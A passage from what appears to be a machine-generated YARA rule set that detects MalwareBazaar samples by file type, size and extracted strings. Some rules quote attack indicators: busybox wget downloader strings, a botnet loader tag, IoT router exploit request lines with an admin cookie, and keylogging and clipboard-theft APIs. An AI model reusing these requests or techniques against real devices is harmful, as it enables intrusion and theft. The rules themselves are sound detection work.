        $s20 = "GetByte"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 87KB and
        all of them
}

rule Windows_2255037ecaa8bae5f9f8635acc752d13d2bef93b2a8db06dcc19c56325fba36f
{
    meta:
        description = "Auto ML: 2255037ecaa8bae5f9f8635acc752d13d2bef93b2a8db06dcc19c56325fba36f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "FlsSetValue"
        $s7 = "FlsGetValue"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "GAIsProcessorFeaturePresent"
        $s16 = "KERNEL32"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 340KB and
        all of them
}

rule Windows_22a65c8bfef865afa71b633009dd4a46ddccb793a241a183202179ec9066d674
{
    meta:
        description = "Auto ML: 22a65c8bfef865afa71b633009dd4a46ddccb793a241a183202179ec9066d674"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "GetProcessWindowStation"
        $s16 = "GetUserObjectInformationA"
        $s17 = "GetLastActivePopup"
        $s18 = "GetActiveWindow"
        $s19 = "USER32.DLL"
        $s20 = "`local static thread guard'"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 240KB and
        all of them
}

rule Linux_22ef62004c1ee82645bed2e01b86464929743e17c0083f830b29a4e27e97791d
{
    meta:
        description = "Auto ML: 22ef62004c1ee82645bed2e01b86464929743e17c0083f830b29a4e27e97791d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "able to winec"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 46KB and
        all of them
}

rule Windows_22f5e2f4e2d83020d7262d04aad452399600581280be58a9e2dafbf4b69f0f62
{
    meta:
        description = "Auto ML: 22f5e2f4e2d83020d7262d04aad452399600581280be58a9e2dafbf4b69f0f62"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "get_ImagenURL"
        $s6 = "set_ImagenURL"
        $s7 = "get_Marca"
        $s8 = "set_Marca"
        $s9 = "get_Categoria"
        $s10 = "set_Categoria"
        $s11 = "System.Data"
        $s12 = "setearConsulta"
        $s13 = "System.Collections.Generic"
        $s14 = "Read"
        $s15 = "add_Load"
        $s16 = "frmConSettings_Load"
        $s17 = "set_AutoScaleMode"
        $s18 = "set_SizeMode"
        $s19 = "set_Image"
        $s20 = "GetTypeFromHandle"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 614KB and
        all of them
}

rule Windows_024715adc889874d81c6f54a1df09e9dc0e7f338eb92e699cc5ba0b2827a34e7
{
    meta:
        description = "Auto ML: 024715adc889874d81c6f54a1df09e9dc0e7f338eb92e699cc5ba0b2827a34e7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 8028KB and
        all of them
}

rule Windows_230a116655f27e771451e599073e25ccbc3bb560c6f041089d896966d253539c
{
    meta:
        description = "Auto ML: 230a116655f27e771451e599073e25ccbc3bb560c6f041089d896966d253539c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "SELECT * FROM Win32_OperatingSystem"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetDefaultDllDirectories"
        $s9 = "s:IDS_BROWSETITLE"
        $s10 = "s:IDS_CMDEXTRACTING"
        $s11 = "s:IDS_FILEHEADERBROKEN"
        $s12 = "s:IDS_CANNOTOPEN"
        $s13 = "s:IDS_CANNOTCREATE"
        $s14 = "s:IDS_WRITEERROR"
        $s15 = "s:IDS_READERROR"
        $s16 = "s:IDS_CLOSEERROR"
        $s17 = "s:IDS_CREATEERRORS"
        $s18 = "s:IDS_ALLFILES"
        $s19 = "s:IDS_EXTRFILESTO"
        $s20 = "s:IDS_EXTRFILESTOTEMP"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3477KB and
        all of them
}

rule Linux_238e8f61c028da657b511061851f38ad90e6ba7146a8f3d417b73af12b5ee20d
{
    meta:
        description = "Auto ML: 238e8f61c028da657b511061851f38ad90e6ba7146a8f3d417b73af12b5ee20d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 31KB and
        all of them
}

rule Linux_23b04d929921e7e881cc44481ac16d1e38d293e72c7b0db151ac4d18c5c9c374
{
    meta:
        description = "Auto ML: 23b04d929921e7e881cc44481ac16d1e38d293e72c7b0db151ac4d18c5c9c374"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "(!PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 32KB and
        all of them
}

rule Linux_23d0db910afaf3f6e17f79fa929f637c1482cda00e3ad4bf0448e9535154bd6e
{
    meta:
        description = "Auto ML: 23d0db910afaf3f6e17f79fa929f637c1482cda00e3ad4bf0448e9535154bd6e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)"
        $s2 = "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)"
        $s3 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00"
        $s4 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00"
        $s5 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00"
        $s6 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01"
        $s7 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00"
        $s8 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
        $s9 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36"
        $s10 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
        $s11 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0"
        $s12 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36"
        $s13 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36"
        $s14 = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
        $s15 = "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)"
        $s16 = "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
        $s17 = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
        $s18 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36"
        $s19 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)"
        $s20 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 127KB and
        all of them
}

rule Windows_23d0ee7d7279e063ddbca86376557628ace23c767171798789cae2174767b31f
{
    meta:
        description = "Auto ML: 23d0ee7d7279e063ddbca86376557628ace23c767171798789cae2174767b31f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "System.Reflection"
        $s5 = "System"
        $s6 = "System.Runtime.CompilerServices"
        $s7 = "System.Runtime.InteropServices"
        $s8 = "System.Diagnostics"
        $s9 = "TargetFrameworkAttribute"
        $s10 = "System.Runtime.Versioning"
        $s11 = "AssemblyFileVersionAttribute"
        $s12 = "Rooting.exe"
        $s13 = "<Module>"
        $s14 = "<Module>{942E1369-9D97-48BA-8D50-A3CBFB96F54B}"
        $s15 = "<Module>{86c4b8f7-c564-4d9f-b051-0cbb01a9e32d}"
        $s16 = "kernel32.dll"
        $s17 = "CreateRemoteThread"
        $s18 = "System.IO"
        $s19 = "Module"
        $s20 = "System.Security.Cryptography"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 366KB and
        all of them
}

rule Linux_23d7fba27c029e99af3b12f097408f4f05d9ace29b4a964ced0b301958ee363a
{
    meta:
        description = "Auto ML: 23d7fba27c029e99af3b12f097408f4f05d9ace29b4a964ced0b301958ee363a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 34KB and
        all of them
}

rule Windows_23f2af12d94f4f4ad3809c443a3d1bb286bfd47b2a10c7efe682c5222bae7fc2
{
    meta:
        description = "Auto ML: 23f2af12d94f4f4ad3809c443a3d1bb286bfd47b2a10c7efe682c5222bae7fc2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".rsrc"
        $s3 = "@.reloc"
        $s4 = "System"
        $s5 = "System.Runtime.CompilerServices"
        $s6 = "TargetFrameworkAttribute"
        $s7 = "System.Runtime.Versioning"
        $s8 = "System.Runtime.InteropServices"
        $s9 = "System.Core"
        $s10 = "System.Diagnostics"
        $s11 = "<Module>"
        $s12 = "FwK6ptSjPPRSWiNrqj"
        $s13 = "System.IO"
        $s14 = "lw2loexi1J8quHGetO3"
        $s15 = "<Module>{B8E59B56-A3C7-4156-94C6-EC407EEE2CB5}"
        $s16 = "System.Text"
        $s17 = "get_Length"
        $s18 = "get_Chars"
        $s19 = "System.Collections.Generic"
        $s20 = "System.Linq"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1120KB and
        all of them
}

rule Windows_2404b71d604fb30ab5de233155e78e9110552259d132d24b3a62e6074bab910a
{
    meta:
        description = "Auto ML: 2404b71d604fb30ab5de233155e78e9110552259d132d24b3a62e6074bab910a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "GAIsProcessorFeaturePresent"
        $s16 = "KERNEL32"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 203KB and
        all of them
}

rule Windows_2424d5739411b1a48bdca1869745c8d4811cd6aefe37cb7bf264765c5c5070cb
{
    meta:
        description = "Auto ML: 2424d5739411b1a48bdca1869745c8d4811cd6aefe37cb7bf264765c5c5070cb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "`local static thread guard'"
        $s16 = "`placement delete[] closure'"
        $s17 = "`placement delete closure'"
        $s18 = "delete[]"
        $s19 = "delete"
        $s20 = "`non-type-template-parameter"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 305KB and
        all of them
}

rule Windows_242d4132ff4d598dcf4a9013477d69dd9bc28779b3415a9b60136efe19e53fb5
{
    meta:
        description = "Auto ML: 242d4132ff4d598dcf4a9013477d69dd9bc28779b3415a9b60136efe19e53fb5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "<Module>"
        $s6 = "kYxcJFg.exe"
        $s7 = "System"
        $s8 = "System.Windows.Forms"
        $s9 = "CallWindowProc"
        $s10 = "btnDelete_Click"
        $s11 = "FormClosedEventArgs"
        $s12 = "FoodMenu_FormClosed"
        $s13 = "System.ComponentModel"
        $s14 = "btnDelete"
        $s15 = "AddRoom_FormClosed"
        $s16 = "System.Runtime.CompilerServices"
        $s17 = "System.Runtime.InteropServices"
        $s18 = "System.Reflection"
        $s19 = "GetEntryAssembly"
        $s20 = "get_Location"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 349KB and
        all of them
}

rule Windows_029fbcceb82323987309e3f0f2f3a6626b8dc2894c868f96bcb8105405018b69
{
    meta:
        description = "Auto ML: 029fbcceb82323987309e3f0f2f3a6626b8dc2894c868f96bcb8105405018b69"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "ThreadSafeObjectProvider`1"
        $s6 = "kernel32"
        $s7 = "Microsoft.Win32"
        $s8 = "user32"
        $s9 = "GetModuleFileNameA"
        $s10 = "SetWindowsHookExA"
        $s11 = "get_ASCII"
        $s12 = "get_formSubmitURL"
        $s13 = "set_formSubmitURL"
        $s14 = "System.IO"
        $s15 = "MoveFileExW"
        $s16 = "Create__Instance__"
        $s17 = "UploadData"
        $s18 = "GetClipboardData"
        $s19 = "System.Web"
        $s20 = "System.Collections.Generic"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 130KB and
        all of them
}

rule Windows_245ab71d310473ead8437bc01a370dfd1497cf3866c9e4adddea277cc3ddacb5
{
    meta:
        description = "Auto ML: 245ab71d310473ead8437bc01a370dfd1497cf3866c9e4adddea277cc3ddacb5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4469KB and
        all of them
}

rule Linux_247da4e7b039a6ef66e79e642a2d12e42d3a4a8b54de73fd03da4f0e76666f93
{
    meta:
        description = "Auto ML: 247da4e7b039a6ef66e79e642a2d12e42d3a4a8b54de73fd03da4f0e76666f93"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 21KB and
        all of them
}

rule Windows_2490594b4bef9c760dec4dc7a84f7527b0b612951ac880e1d5783422fb2a361e
{
    meta:
        description = "Auto ML: 2490594b4bef9c760dec4dc7a84f7527b0b612951ac880e1d5783422fb2a361e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".text"
        $s3 = "`.data"
        $s4 = ".rdata"
        $s5 = "@.reloc"
        $s6 = "B.rsrc"
        $s7 = "System"
        $s8 = "IOffset"
        $s9 = "ImplGetter"
        $s10 = "Create"
        $s11 = "GetInterface"
        $s12 = "GetInterfaceEntry"
        $s13 = "GetInterfaceTable"
        $s14 = "GetHashCode"
        $s15 = "NewInstance"
        $s16 = "PPackageTypeInfo$#@"
        $s17 = "TPackageTypeInfo"
        $s18 = "PLibModule"
        $s19 = "TLibModule"
        $s20 = "Module"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 3496KB and
        all of them
}

rule Windows_24acaabe7d3a9df77b0d8dbdcf500d538a99f3128c65a740ef85fbcec6e78294
{
    meta:
        description = "Auto ML: 24acaabe7d3a9df77b0d8dbdcf500d538a99f3128c65a740ef85fbcec6e78294"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "`.reloc"
        $s5 = "@.rsrc"
        $s6 = "GetCurrentThreadId"
        $s7 = "RtlUnwind"
        $s8 = "SHELL32.dll"
        $s9 = "SetClipboardData"
        $s10 = "LoadResource"
        $s11 = "GetSystemTimeAsFileTime"
        $s12 = "SetStdHandle"
        $s13 = "GetEnvironmentStringsW"
        $s14 = "GetCurrentProcessId"
        $s15 = "SetThreadAffinityMask"
        $s16 = "GetEnvironmentStrings"
        $s17 = "ADVAPI32.dll"
        $s18 = "GetCPInfo"
        $s19 = "CreateToolhelp32Snapshot"
        $s20 = "GetStartupInfoA"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6062KB and
        all of them
}

rule Windows_24ca467f398c64c1f70011ffc53598f2f09971998e08e2267f39f06776afbb15
{
    meta:
        description = "Auto ML: 24ca467f398c64c1f70011ffc53598f2f09971998e08e2267f39f06776afbb15"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".rsrc"
        $s2 = "uzSet"
        $s3 = "sEtp"
        $s4 = "CMDh"
        $s5 = "WInN"
        $s6 = "GetModuleHandleA"
        $s7 = "GetProcAddress"
        $s8 = "KERNEL32.DLL"
        $s9 = "USER32.dll"
        $s10 = "GetSystemMetrics"
        $s11 = "CreateCompatibleBitmap"
        $s12 = "ADVAPI32.dll"
        $s13 = "RegCloseKey"
        $s14 = "SHELL32.dll"
        $s15 = "SHGetFolderPathA"
        $s16 = "WININET.dll"
        $s17 = "HttpOpenRequestA"
        $s18 = "gdiplus.dll"
        $s19 = "WTSAPI32.dll"
    condition:
        uint32(0) == 0x00405a4d and
        filesize < 6490KB and
        all of them
}

rule Windows_250e92900b50889eb179775b49d66ed912dcfe00b79c0e275cf2a5a54c5f0d41
{
    meta:
        description = "Auto ML: 250e92900b50889eb179775b49d66ed912dcfe00b79c0e275cf2a5a54c5f0d41"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 6258KB and
        all of them
}

rule Linux_2515ccfd8d711ed45f684c62c5d3acfbbcbc13fa4e0f851e0656eb2d7ffc781c
{
    meta:
        description = "Auto ML: 2515ccfd8d711ed45f684c62c5d3acfbbcbc13fa4e0f851e0656eb2d7ffc781c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s7 = "Connection: keep-alive"
        $s8 = "/proc/%d/cmdline"
        $s9 = "busybox wget"
        $s10 = "/usr/lib/systemd/systemd"
        $s11 = "/usr/libexec/openssh/sftp-server"
        $s12 = "shell"
        $s13 = "httpd"
        $s14 = "system"
        $s15 = "wget-log"
        $s16 = "1337SoraLOADER"
        $s17 = "nloads"
        $s18 = "elfLoad"
        $s19 = "POST /goform/set_LimitClient_cfg HTTP/1.1"
        $s20 = "Cookie: user=admin"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 195KB and
        all of them
}

rule Linux_251d0879dcafacb0046e514a4d8c93b0c6c65168711e8f8f9b621afbefd5c3e5
{
    meta:
        description = "Auto ML: 251d0879dcafacb0046e514a4d8c93b0c6c65168711e8f8f9b621afbefd5c3e5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)"
        $s2 = "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)"
        $s3 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00"
        $s4 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00"
        $s5 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00"
        $s6 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01"
        $s7 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00"
        $s8 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
        $s9 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36"
        $s10 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
        $s11 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0"
        $s12 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36"
        $s13 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36"
        $s14 = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
        $s15 = "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)"
        $s16 = "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
        $s17 = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
        $s18 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36"
        $s19 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)"
        $s20 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 102KB and
        all of them
}

rule Windows_254f8d074c069e55870426682a68552a95faf35df76b024d7069ddccd7e58e76
{
    meta:
        description = "Auto ML: 254f8d074c069e55870426682a68552a95faf35df76b024d7069ddccd7e58e76"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "System.Runtime.CompilerServices"
        $s5 = "System"
        $s6 = "System.Diagnostics"
        $s7 = "System.Reflection"
        $s8 = "System.Runtime.InteropServices"
        $s9 = "AssemblyFileVersionAttribute"
        $s10 = "TargetFrameworkAttribute"
        $s11 = "System.Runtime.Versioning"
        $s12 = "System.Resources"
        $s13 = "AssemblyKeyFileAttribute"
        $s14 = "geometry_in_simple_words_v2.exe"
        $s15 = "<Module>"
        $s16 = "ThreadSafeObjectProvider`1"
        $s17 = "MySettings"
        $s18 = "ApplicationSettingsBase"
        $s19 = "System.Configuration"
        $s20 = "MySettingsProperty"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5112KB and
        all of them
}

rule Windows_25526f42bedae2b4788fb2a547ca8a100770f2d0bf8f13b483899eaf52b92130
{
    meta:
        description = "Auto ML: 25526f42bedae2b4788fb2a547ca8a100770f2d0bf8f13b483899eaf52b92130"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".rsrc"
        $s2 = ".data"
        $s3 = "processorArchitecture=\"X86\""
        $s4 = "name=\"Enigma.exe\""
        $s5 = "type=\"win32\" />"
        $s6 = "type=\"win32\""
        $s7 = "name=\"Microsoft.Windows.Common-Controls\""
        $s8 = "processorArchitecture=\"X86\""
